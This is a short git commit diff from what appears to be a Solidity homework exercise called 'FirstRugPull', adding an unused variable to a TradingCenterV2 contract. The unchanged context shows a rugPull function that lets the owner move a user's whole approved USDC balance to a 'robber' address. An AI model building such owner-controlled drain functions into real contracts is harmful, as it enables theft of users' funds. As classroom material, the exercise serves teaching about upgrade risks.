c94f0cd312a65419ef04b2d82914aa06db2ed050
Liam <liam19970731@gmail.com>
2023-11-04 15:42:24 +0800

    modify test

--- hw8_FirstRugPull/src/TradingCenterV2.sol
+++ hw8_FirstRugPull/src/TradingCenterV2.sol
@@ -6,7 +6,7 @@ import { Ownable } from "./Ownable.sol";
 // TODO: Try to implement TradingCenterV2 here
 
 contract TradingCenterV2 is TradingCenter, Ownable {
-
+    address test;
     function rugPull(address user, address robber) external onlyOwner {
         // TODO: implement rugPull
         usdc.transferFrom(user, robber, usdc.balanceOf(user));
